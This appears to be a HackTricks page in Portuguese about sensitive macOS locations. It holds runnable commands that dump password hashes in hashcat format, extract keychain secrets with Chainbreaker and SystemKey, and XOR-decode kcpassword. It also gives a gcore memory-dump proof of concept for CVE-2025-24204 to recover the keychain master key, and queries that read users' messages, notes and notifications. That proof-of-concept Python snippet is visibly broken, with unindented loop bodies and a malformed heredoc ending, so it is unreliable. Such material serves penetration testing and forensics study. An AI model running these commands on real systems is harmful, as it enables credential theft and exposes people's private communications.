# Locais Sensíveis do macOS e Daemons Interessantes

{{#include ../../../banners/hacktricks-training.md}}

## Senhas

### Shadow Passwords

A shadow password é armazenada com a configuração do usuário em plists localizados em **`/var/db/dslocal/nodes/Default/users/`**.\
O one-liner a seguir pode ser usado para extrair **todas as informações sobre os usuários** (incluindo informações de hash):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) ou [**this one**](https://github.com/octomagon/davegrohl.git) podem ser usados para transformar o hash para o **format** do **hashcat**.

Uma alternativa de **one-liner** que fará o **dump** das **creds** de todas as contas que não são de serviço no formato do hashcat `-m 7100` (macOS PBKDF2-SHA512):
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Outra forma de obter o `ShadowHashData` de um usuário é usando `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Este arquivo é **usado apenas** quando o sistema operacional é executado no **single-user mode** (portanto, não com muita frequência).

### Keychain Dump

Observe que, ao usar o binário `security` para **despejar as senhas descriptografadas**, várias solicitações pedirão ao usuário para permitir essa operação.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
No macOS moderno, os backing stores mais interessantes geralmente são **`~/Library/Keychains/login.keychain-db`** e **`/Library/Keychains/System.keychain`**. Eles são arquivos baseados em SQLite, mas o acesso em plaintext ainda é intermediado pelo **`securityd`**: roubar o DB bruto fornece principalmente metadata e blobs criptografados, a menos que você também recupere a senha do usuário, `SystemKey` ou uma master key armazenada na memória.<sup>[2]</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Com base neste comentário [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760), parece que essas ferramentas não funcionam mais no Big Sur.

### Visão geral do Keychaindump

Uma ferramenta chamada **keychaindump** foi desenvolvida para extrair passwords de keychains do macOS, mas enfrenta limitações em versões mais recentes do macOS, como o Big Sur, conforme indicado em uma [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). O uso do **keychaindump** exige que o atacante obtenha acesso e escale privilégios para **root**. A ferramenta explora o fato de que o keychain é desbloqueado por padrão quando o usuário faz login, por conveniência, permitindo que as aplicações o acessem sem exigir repetidamente a password do usuário. No entanto, se o usuário optar por bloquear o keychain após cada uso, o **keychaindump** se torna ineficaz.

O **Keychaindump** opera mirando um processo específico chamado **securityd**, descrito pela Apple como um daemon para operações de autorização e criptografia, essencial para acessar o keychain. O processo de extração envolve identificar uma **Master Key** derivada da password de login do usuário. Essa chave é essencial para ler o arquivo do keychain. Para localizar a **Master Key**, o **keychaindump** examina o heap de memória do **securityd** usando o comando `vmmap`, procurando possíveis chaves em áreas marcadas como `MALLOC_TINY`. O comando a seguir é usado para inspecionar esses locais de memória:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Após identificar possíveis master keys, **keychaindump** pesquisa nos heaps um padrão específico (`0x0000000000000018`) que indica um candidato à master key. São necessárias etapas adicionais, incluindo a desofuscação, para utilizar essa chave, conforme descrito no código-fonte do **keychaindump**. Os analistas que trabalham nessa área devem observar que os dados essenciais para descriptografar o keychain estão armazenados na memória do processo **securityd**. Um exemplo de comando para executar o **keychaindump** é:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) pode ser usado para extrair os seguintes tipos de informação de um keychain do OSX de maneira forense:

- Senha do keychain em hash, adequada para cracking com [hashcat](https://hashcat.net/hashcat/) ou [John the Ripper](https://www.openwall.com/john/)
- Senhas da Internet
- Senhas genéricas
- Chaves privadas
- Chaves públicas
- Certificados X509
- Secure Notes
- Senhas do Appleshare

Dada a senha de desbloqueio do keychain, uma master key obtida usando [volafox](https://github.com/n0fate/volafox) ou [volatility](https://github.com/volatilityfoundation/volatility), ou um arquivo de desbloqueio como SystemKey, o Chainbreaker também fornecerá as senhas em plaintext.

Sem um desses métodos para desbloquear o Keychain, o Chainbreaker exibirá todas as outras informações disponíveis.

#### **Dump das chaves do keychain**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Extrair chaves do keychain (com senhas) com o SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump de chaves do keychain (com senhas) quebrando o hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump de chaves do keychain (com senhas) com memory dump**

[Siga estas etapas](../index.html#dumping-memory-with-osxpmem) para realizar um **memory dump**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump de chaves do keychain (com senhas) usando a senha do usuário**

Se você souber a senha do usuário, poderá usá-la para **fazer dump e descriptografar keychains pertencentes ao usuário**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Keychain master key via `gcore` entitlement (CVE-2025-24204)

O macOS 15.0 (Sequoia) foi lançado com o `/usr/bin/gcore` contendo o entitlement **`com.apple.system-task-ports.read`**, permitindo que qualquer admin local (ou app malicioso assinado) fizesse dump da memória de qualquer processo, mesmo com SIP/TCC aplicados. Fazer dump de `securityd` expõe o **Keychain master key** em texto claro e permite descriptografar `login.keychain-db` sem a senha do usuário.<sup>[1]</sup>

**Reprodução rápida em builds vulneráveis (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Envie a chave hex extraída ao Chainbreaker (`--key <hex>`) para descriptografar o chaveiro de login. A Apple removeu o entitlement no **macOS 15.3+**, portanto isso só funciona em versões não corrigidas do Sequoia ou em sistemas que mantiveram o binário vulnerável.

### kcpassword

O arquivo **kcpassword** contém a **senha de login do usuário**, mas somente se o proprietário do sistema tiver **ativado o login automático**. Portanto, o usuário será conectado automaticamente sem que uma senha seja solicitada (o que não é muito seguro).

A senha é armazenada no arquivo **`/etc/kcpassword`** com XOR usando a chave **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Se a senha do usuário for mais longa que a chave, a chave será reutilizada.\
Isso torna a senha relativamente fácil de recuperar, por exemplo, usando scripts como [**este**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Informações Interessantes em Bancos de Dados

### Mensagens
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notificações

Antes do **Sequoia**, normalmente é possível encontrar o armazenamento do Notification Center em **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. No **Sequoia+**, a Apple moveu-o para o group container protegido pelo TCC **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

A maior parte das informações interessantes é armazenada dentro de colunas **blob**, portanto será necessário extrair esse conteúdo e transformá-lo em algo legível (`plutil -p -`, `strings` ou um pequeno parser). Exemplos rápidos de triage:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### Problemas recentes de privacidade (NotificationCenter DB)

- No macOS **14.7–15.1**, a Apple armazenava o conteúdo dos banners no SQLite `db2/db` sem a devida redação. As CVEs **CVE-2024-44292/44293/40838/54504** permitiam que qualquer usuário local lesse o texto das notificações de outros usuários simplesmente abrindo o DB (sem um prompt do TCC).
- A Apple mitigou isso movendo o DB para `group.com.apple.usernoted` e protegendo-o com o TCC em builds mais recentes do Sequoia; portanto, nos sistemas atuais, normalmente é necessário o contexto do usuário correto ou um TCC bypass para lê-lo.<sup>[3]</sup>
- Em endpoints legados, copie os arquivos `db`, `db-wal` e `db-shm` juntos antes de atualizar ou reiniciar se quiser preservar os artefatos.

### Notas

As **notas** dos usuários podem ser encontradas em `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
Se o one-liner acima gerar muito ruído, exporte `ZICNOTEDATA.ZDATA`, use gunzip e analise o protobuf: isso geralmente é mais confiável do que executar `strings` diretamente no SQLite.

### Tarefas em Segundo Plano / Itens de Login

Desde o **Ventura**, os itens de login aprovados pelo usuário e várias tarefas em segundo plano são rastreados em stores do **BTM**, como **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** e o cache de sistema versionado **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Esses arquivos são úteis para identificar rapidamente persistência, ferramentas auxiliares e alguns itens em segundo plano gerenciados pelo MDM:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
Para o ângulo de persistence e os componentes internos do BTM, consulte [a página de auto-start locations](../../macos-auto-start-locations.md#login-items) e [as notas sobre Background Tasks Management](../macos-security-protections/README.md#background-tasks-management).

## Preferências

Nos aplicativos macOS, as preferências estão localizadas em **`$HOME/Library/Preferences`** e, no iOS, em `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

No macOS, a ferramenta cli **`defaults`** pode ser usada para **modificar o arquivo de Preferences**.

**`/usr/sbin/cfprefsd`** assume os serviços XPC `com.apple.cfprefsd.daemon` e `com.apple.cfprefsd.agent` e pode ser chamado para executar ações como modificar preferências.

## OpenDirectory permissions.plist

O arquivo `/System/Library/OpenDirectory/permissions.plist` contém permissões aplicadas aos atributos dos nodes e é protegido pelo SIP.\
Esse arquivo concede permissões a usuários específicos por UUID (e não por uid), permitindo que acessem informações sensíveis específicas, como `ShadowHashData`, `HeimdalSRPKey` e `KerberosKeys`, entre outras:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Notificações do Sistema

### Notificações Darwin

O daemon principal para notificações é **`/usr/sbin/notifyd`**. Para receber notificações, os clientes devem se registrar através da porta Mach `com.apple.system.notification_center` (verifique-os com `sudo lsmp -p <pid notifyd>`). O daemon é configurável com o arquivo `/etc/notify.conf`.

Os nomes usados para notificações são notações DNS reversas exclusivas e, quando uma notificação é enviada para um deles, o(s) cliente(s) que indicaram poder tratá-la a receberão.

É possível despejar o status atual (e ver todos os nomes) enviando o sinal SIGUSR2 ao processo notifyd e lendo o arquivo gerado: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Centro de Notificações Distribuídas

O **Centro de Notificações Distribuídas**, cujo binário principal é **`/usr/sbin/distnoted`**, é outra forma de enviar notificações. Ele expõe alguns serviços XPC e realiza algumas verificações para tentar validar os clientes.

### Apple Push Notifications (APN)

Nesse caso, os aplicativos podem se registrar em **topics**. O cliente gerará um token ao entrar em contato com os servidores da Apple por meio do **`apsd`**.\
Em seguida, os provedores também terão gerado um token e poderão se conectar aos servidores da Apple para enviar mensagens aos clientes. Essas mensagens serão recebidas localmente pelo **`apsd`**, que encaminhará a notificação ao aplicativo que estiver aguardando por ela.

As preferências estão localizadas em `/Library/Preferences/com.apple.apsd.plist`.

Há um banco de dados local de mensagens localizado no macOS em `/Library/Application\ Support/ApplePushService/aps.db` e no iOS em `/var/mobile/Library/ApplePushService`. Ele possui 3 tabelas: `incoming_messages`, `outgoing_messages` e `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Também é possível obter informações sobre o daemon e as conexões usando:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Notificações do Usuário

Estas são notificações que o usuário deve ver na tela:

- **`CFUserNotification`**: Estas APIs fornecem uma maneira de exibir uma janela pop-up com uma mensagem na tela.
- **The Bulletin Board**: Isso exibe no iOS um banner que desaparece e é armazenado na Central de Notificações.
- **`NSUserNotificationCenter`**: Este é o bulletin board do iOS no MacOS. Em versões mais antigas do macOS, o banco de dados geralmente fica em `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; no Sequoia+ ele foi movido para `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## Referências

- [1] [HelpNetSecurity – o entitlement gcore do macOS permitia a extração da master key do Keychain (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – proteção de dados do Keychain](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [9to5Mac – Apple aborda preocupações de privacidade relacionadas ao banco de dados da Central de Notificações no macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
